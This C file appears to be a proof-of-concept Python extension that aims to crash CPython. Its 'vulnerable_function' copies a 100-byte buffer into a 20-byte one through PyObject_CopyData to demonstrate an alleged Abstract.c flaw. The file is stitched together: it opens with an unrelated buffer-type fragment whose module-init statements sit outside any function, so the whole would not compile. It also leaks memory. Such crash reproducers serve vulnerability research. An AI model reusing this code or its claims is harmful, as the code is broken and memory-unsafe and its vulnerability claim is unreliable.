/* Include the approperiate API for reference, must install libraries if not available 
 command like (debian): sudo apt-get install python3.X-dev */

#include <Python.h>

typedef struct {
    PyObject_HEAD
    int block1[2];
    int block2[2];
} MyBuffer;

static int MyBuffer_getbuffer(MyBuffer* self, Py_buffer* view, int flags) {
    if (view == NULL) {
        PyErr_SetString(PyExc_ValueError, "NULL view in getbuffer");
        return -1;
    }

    view->obj = (PyObject*)self;
    view->buf = &self->block1;  // Start of the buffer
    view->len = 4 * sizeof(int);  // Total size of the buffer (4 integers)
    view->readonly = 0;
    view->itemsize = sizeof(int);  // Size of a single item in the buffer
    view->format = "i";  // Integer format
    view->ndim = 2;  // Number of dimensions

    static Py_ssize_t shape[2] = {2, 2};
    view->shape = shape;

    static Py_ssize_t strides[2] = {2 * sizeof(int), sizeof(int)};
    view->strides = strides;

    view->suboffsets = NULL;  // No suboffsets

    Py_INCREF(self);  // Increase reference count
    return 0;
}

static PyBufferProcs MyBuffer_as_buffer = {
    (getbufferproc)MyBuffer_getbuffer,
    (releasebufferproc)NULL,  // We don't need to do anything to release the buffer
};

static PyTypeObject MyBufferType = {
    PyVarObject_HEAD_INIT(NULL, 0)
    "MyBuffer",  /* tp_name */
    sizeof(MyBuffer),  /* tp_basicsize */
    // ... Initialize other members of the type object here ...
    &MyBuffer_as_buffer,  /* tp_as_buffer */
};

// In the module's initialization function:
if (PyType_Ready(&MyBufferType) < 0)
    return NULL;
Py_INCREF(&MyBufferType);
PyModule_AddObject(module, "MyBuffer", (PyObject*)&MyBufferType);













// The function we want to expose to Python
static PyObject* vulnerable_function(PyObject* self, PyObject* args)
{
    /* setup first buffer of explicit length */
    char* src_buffer = calloc(1001, sizeof(char)); 
    memset(src_buffer, 'A', 1000);

    Py_ssize_t src_len = 100;
    PyObject* src_pybytes = PyBytes_FromStringAndSize(src_buffer, src_len);
    Py_buffer src_view;

    /* required to actually allocate the data into pybytes */
    if (PyObject_GetBuffer(src_pybytes, &src_view, PyBUF_SIMPLE) != 0) {
        printf("Couldn't allocate buffer...\n");
    }

    /* setup second buffer of explicit length */
    char* dst_buffer = calloc(20, sizeof(char));

    Py_ssize_t dst_len = 20;
    PyObject* dst_pybytes = PyBytes_FromStringAndSize(dst_buffer, dst_len);
    Py_buffer dst_view;

    /* required to actually allocate the data into pybytes */
    if (PyObject_GetBuffer(dst_pybytes, &dst_view, PyBUF_SIMPLE) != 0) {
        printf("Couldn't allocate buffer...\n");
    }

    /* Print buffer information to user */
    printf("Source buffer has a size of [%ld] B and contains [%s]\n", src_view.len, (char*)src_view.buf);
    printf("Destionation buffer has a size of [%ld] B and contains [%s]\n", dst_view.len, (char*)dst_view.buf);

    /* do the vulnerable copy -- this should segfault and exit prior to "end of function" */
    int result = PyObject_CopyData(dst_pybytes, src_pybytes);

    // Release the buffers when done
    PyBuffer_Release(&src_view);
    PyBuffer_Release(&dst_view);    

    printf("End of function, returning!\n");
    Py_RETURN_NONE;
    
    return 0;
}

// Define a method table actually exposing the function itself
static PyMethodDef VulnerableMethods[] = {
    {"vulnerable_function",  vulnerable_function, METH_VARARGS, "Demonstrate Abstract.c vulnerability'"},
    {NULL, NULL, 0, NULL}
};

// Create and define the module
static struct PyModuleDef vulnerablemodule = {
    PyModuleDef_HEAD_INIT,
    "vulnerable_function",
    NULL,
    -1,
    VulnerableMethods
};

// Export the function so Python can call it
PyMODINIT_FUNC
PyInit_poc(void)
{
    return PyModule_Create(&vulnerablemodule);
}
